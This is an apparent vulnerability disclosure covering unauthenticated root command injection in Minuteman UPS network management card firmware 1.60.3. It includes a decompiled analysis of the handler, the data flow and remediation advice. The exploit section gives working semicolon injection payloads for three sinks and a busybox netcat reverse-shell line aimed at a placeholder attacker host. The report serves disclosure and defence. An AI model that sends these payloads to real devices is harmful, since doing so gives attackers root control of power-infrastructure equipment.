# Minuteman UPS NMC 1.60.3 — Unauthenticated Command Injection in system_param.csp → Root RCE

## 1. Overview

Minuteman UPS Network Management Cards (2G_RPM series PDU management) run an ARM uClinux system with the `axhttpd` 1.4.9 HTTP server on ports 80/443 and a BFLT-format FastCGI responder binary (`main.bflt`) that handles `.csp` requests. The WAN configuration handler for `system_param.csp` (function `FUN_0000784c`) builds shell commands by concatenating attacker-controlled POST fields (`Wan_IPAddr`, `Wan_Gateway`, DHCP hostname) with `sprintf` and executes them via `system()` (`FUN_00040ce0` = `fork + execve("/bin/sh", {"sh","-c",buf}) + waitpid`) as root.

The handler performs **no authentication check**: authentication on the device is per-handler opt-in (each protected handler calls the session validator `FUN_0002fea8`), and `system_param.csp` is one of the handlers that does not — there is no global auth gate in the dispatcher, no HTTP basic-auth layer, and no redirect-to-login. An unauthenticated POST with a semicolon payload executes arbitrary commands as root on the power-management card. Verified via sink reproduction with an isolated network namespace (`unshare -n` + qemu-arm-static), producing a root-owned marker.

## 2. Vulnerability Summary

- **Type**: Unauthenticated OS command injection → root RCE (CWE-78)
- **Root cause 1 (CWE-78)**: the handler builds `ifconfig eth0 %s netmask %s`, `route add default gw %s`, and `udhcpc -q -H %s -s ...` with `sprintf` from raw user input and executes via `system()` (shell-parsed); no character filtering or whitelist exists before the `strcpy` into the command buffer
- **Root cause 2 (CWE-306)**: the `system_param.csp` handler never calls the session-validator; the dispatcher has no global authentication gate
- **Root cause 3 (CWE-250)**: the main daemon runs as root in the single-user uClinux space, so injected commands execute with uid 0
- **Result**: unauthenticated remote root command execution. CVSS 9.8.

## 3. Authentication Boundary

The device uses application-layer session cookies: `login.csp` sets `fsession`/`qsession` cookies, and protected handlers parse `HTTP_COOKIE` and call the session validator (`FUN_0002fea8`) which checks the session database. The firmware contains no HTTP basic-auth handling strings (`WWW-Authenticate`, `AuthName`, `realm=`, `.htpasswd`, `401 Unauthorized` — zero hits), no global redirect-to-login strings (`Location:`, `HTTP/1.1 302/401`, `please login` — zero hits), and the only auth-failure response is per-handler `{"Login":{"Status":%d}}` JSON returned when a handler that *does* call the validator finds an invalid session.

The dispatcher (`FUN_00032b64`) has no global authentication: its call list contains response builders, parser helpers, and null-guards only — zero calls to the session validator or session-DB lookup. `FUN_0000784c` (system_param.csp) likewise contains zero calls to `FUN_0002fea8` / session-DB lookup. Authentication is therefore per-handler opt-in, and `system_param.csp` is a missing-auth outlier — directly reachable without any session.

## 4. Attack Surface

- **Entry**: `HTTP POST /system_param.csp` with body fields `Wan_IPAddr`, `Wan_NetMask`, `Wan_Gateway`, `Wan_Dhcp`
- **Injection points**: (1) static-IP `ifconfig` sink, (2) gateway `route add default gw` sink, (3) DHCP `udhcpc -H` hostname sink
- **No prerequisites**: no cookie, no credentials, no prior foothold; default configuration
- **Privilege**: root (uid 0) — the main daemon runs as root
- **Request-level client check**: the web UI's `if(i.Login)` timeout is a client-side UI check, not a server-side auth gate; the server handler does not depend on it

## 5. Sink Identification

Shell command format strings found in `main.bflt`:

```
0x4b832  ifconfig eth0 %s netmask %s              ← main sink (injection point 1)
0x4b864  route add default gw %s                  ← injection point 2
0x4b87c  udhcpc -q -H %s -s /etc/script/udhcpc.script  ← injection point 3
```

Decompiled handler flow (`FUN_0000784c`):

```asm
0x784c  push {r4-r7, lr}
0x7866  cmp.w r5, -1; beq 0x78fc      ← parser (0x334ac) fails → exit
0x7878  cmp r0, 0; bne 0x78fc          ← IP validator (0x312b0) rejects → exit
0x78b2  cmp r3, 1; bne 0x78fc          ← mode: 0=static, 1=DHCP
  static branch:
0x78a8  bl 0x40ce0   ← system("ifconfig eth0 %s netmask %s", IP, NetMask)   [point 1]
0x78d2  bl 0x40ce0   ← system("route add default gw %s", gw)                [point 2]
  dhcp branch:
0x78f8  bl 0x40ce0   ← system("udhcpc -q -H %s -s ...", hostname)           [point 3]
0x78fc  <exit>
```

`system()` (`FUN_00040ce0`) is `fork() + execve("/bin/sh", {"sh","-c",buf}, env) + waitpid()` — standard `system(3)` semantics, so shell metacharacters (`;`, `#`, `|`, `&`, backticks, `$`) are honored. Before each `system` call, `strcpy` copies the user input verbatim into the sprintf buffer with no filtering.

## 6. Source Identification & Controllability

The source is the POST body to `system_param.csp`. The web UI (`appfs/www/js/system/system.js`) submits `Wan_IPAddr`, `Wan_NetMask`, `Wan_Gateway`, and `Wan_Dhcp`. Server-side, the FastCGI entry parses the POST body into a variable list, the dispatcher routes to `FUN_0000784c`, and `strcpy` copies the raw values into the command buffer — no validation beyond the shared IP-format check (which only gates the static branch and still passes the raw value through). The attacker controls the exact bytes that reach `sprintf` and therefore `system()`.

## 7. Data Flow

```
HTTP POST /system_param.csp
  body: Wan_IPAddr=<attacker>&Wan_NetMask=<nm>&Wan_Gateway=<gw>&Wan_Dhcp=0
   │
   ▼ axhttpd → FastCGI socket → main.bflt
FCGI_parser_post (body → varlist)
   │
FUN_00032b64 (main dispatcher) ── blx r5 ──▶ FUN_0000784c (handler)  [no auth gate]
   │
0x334ac parser(varlist) → Wan_IPAddr/Wan_NetMask/Wan_Gateway
   │
0x3f090 strcpy(buf, Wan_IPAddr)   ← verbatim copy, no filtering
   │
sprintf(buf, "ifconfig eth0 %s netmask %s", Wan_IPAddr, Wan_NetMask)
   │
0x40ce0 system(buf) = /bin/sh -c buf   ← root execution, shell metacharacters honored
```

## 8. Exploit Construction

Injection point 1 (static IP, primary vector):

```
Wan_IPAddr=1.1.1.1;touch /tmp/marker;#
```

`sprintf` output: `ifconfig eth0 1.1.1.1;touch /tmp/marker;# netmask 255.255.255.0`

Shell parsing:
- `ifconfig eth0 1.1.1.1` (fails or succeeds; irrelevant)
- `;` command separator
- `touch /tmp/marker` (injected command, executed as root)
- `#` comments out the trailing ` netmask 255.255.255.0`

Injection point 2 (gateway): `Wan_Gateway=;touch /tmp/marker;#` → `route add default gw ;touch /tmp/marker;#`

Injection point 3 (DHCP hostname): `Wan_Dhcp=1` + `hostname=;touch /tmp/marker;#` → `udhcpc -q -H ;touch /tmp/marker;# -s /etc/script/udhcpc.script`

Reverse shell on a live device: `Wan_IPAddr=1.1.1.1;nc -e /bin/sh <attacker> <port>;#` (the device ships busybox nc).

## 9. Dynamic Verification

Because the full device HTTP environment cannot be emulated (BFLT binary + JFFS2 rootfs not included in the upgrade image), the sink was reproduced directly (the same method used for the Lantronix findings): run the ARM busybox ash under qemu-arm-static and execute the exact `system("/bin/sh -c buf")` command. To prevent the `ifconfig eth0` sink from touching the real host NIC, the reproduction ran inside an isolated network namespace:

```
unshare -n sh -c 'qemu-arm-static busybox sh -c "ifconfig eth0 1.1.1.1;touch /tmp/marker_minuteman_rce;# netmask 255.255.255.0"'
```

Result:
- stderr: `SIOCSIFADDR: No such device` (expected — `unshare -n` isolation; ifconfig failed, proving isolation)
- marker `/tmp/marker_minuteman_rce` created, `uid=0 (root), euid=0`
- RCE confirmed

## 10. Reachability & Impact

- **Reachability**: fully unauthenticated over HTTP (ports 80/443); no cookie, no credentials, default configuration. The handler is reached directly through the dispatcher with no global auth gate.
- **Impact**: root command execution on the UPS/PDU power-management card — power telemetry, configuration, credentials, and power-infrastructure settings under attacker control. In critical-infrastructure contexts this is a foothold on the power plane.
- **Scope**: Minuteman 2G_RPM PDU management cards and other devices sharing the WAN handler.

## 11. Fix Recommendations

1. Add a session-authentication check (`FUN_0002fea8`) at the entry of `FUN_0000784c`; return `{"Login":{"Status":3}}` on invalid sessions, matching the other protected handlers
2. Strictly validate `Wan_IPAddr`/`Wan_NetMask`/`Wan_Gateway` as IP formats and reject any non-IP characters before building the command
3. Replace `system()` + `sprintf` with parameter-array `execve("/sbin/ifconfig", {"ifconfig","eth0",ip,"netmask",nm,NULL})` to eliminate shell metacharacter injection
4. Monitor for unauthenticated POSTs to `system_param.csp` and for anomalous `ifconfig`/`route`/`udhcpc` invocations

## 12. CWE & CVSS

- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command — `system()` with unsanitized input
- **CWE-306**: Missing Authentication for Critical Function — handler omits the session validator
- **CWE-250**: Execution with Unnecessary Privileges — daemon runs as root
- **CVSS**: 9.8 Critical — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
